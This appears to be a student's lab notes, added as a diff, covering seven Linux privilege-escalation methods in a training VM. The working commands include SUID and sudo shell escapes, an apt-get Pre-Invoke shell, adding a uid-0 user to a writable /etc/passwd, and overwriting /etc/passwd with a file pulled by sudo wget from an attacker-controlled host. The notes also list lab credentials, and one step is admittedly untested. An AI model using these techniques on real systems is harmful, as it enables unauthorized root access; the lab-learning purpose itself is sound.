@@ -1,0 +1,78 @@
+Given
+Seven ways to gain root
+Common LPE tactics
+This lab is meant to teach Linux LPE
+username:password == muhammad:nasef 
+
+Initial Stuff
+Get in, id and whoami
+Whoami = muhammed
+Id, I am part of a ton of groups
+sudo -l
+Root nopasswd:
+Apt-get
+Wget
+vuln/2/sudo?
+
+LPE 1:
+Opened vuln folder
+Selected vuln 1
+Given:
+Suid.c
+Suid
+Stat *
+Suid program is owned by root and has the suid bit set
+Just execute and it will run and return as root
+Cat suid.c
+Spawns a shell
+Just run the program, root shell
+Super easy
+
+LPE 2:
+Vuln 2:
+As revealed by sudo -l I can run program “sudo” as root without password
+“sudo” just spawns a shell
+Owned by root
+Sudo -u root ./sudo
+
+LPE 3:
+Vuln 3:
+“key” contains an RSA Private Key
+SSH uses RSA
+Possibly the root ssh private key?
+ssh -i key root@localhost
+Got root
+LPE 4:
+Vuln 4:
+/etc/passwd is world writable
+Very unusual I would think?
+Simply add another user with a uid and guid of root [0] and leave the password field blank
+itworks::0:0:itworks:/home/muhammad:/bin/bash
+su itworks
+
+LPE 5:
+Vuln 5:
+All out of vulns in the folder :(
+wget can be run as root without passwd
+Host file “passwd” on kali and share with python -m SimpleHTTPServer
+“passwd” file has the same contents as LPE 4
+sudo /bin/wget http://192.168.149.129:8000/passwd -O /etc/passwd
+Was not able to test, but it would work :)
+su itworks
+
+LPE 6:
+Vuln 6:
+apt-get can be run as root without password
+Look on gtfo bins
+TF=$(mktemp)
+echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' > $TF
+sudo apt-get install -c $TF sl
+Whoami
+Root
+
+LPE 7:
+Vuln 7:
+Kernel exploit :)
+Hosted exploit on kali and pulled with wget from simple HTTP server
+Compiled exploit on LPE lab
+Error compiling, but kernel is vulnerable. [2.6.24]
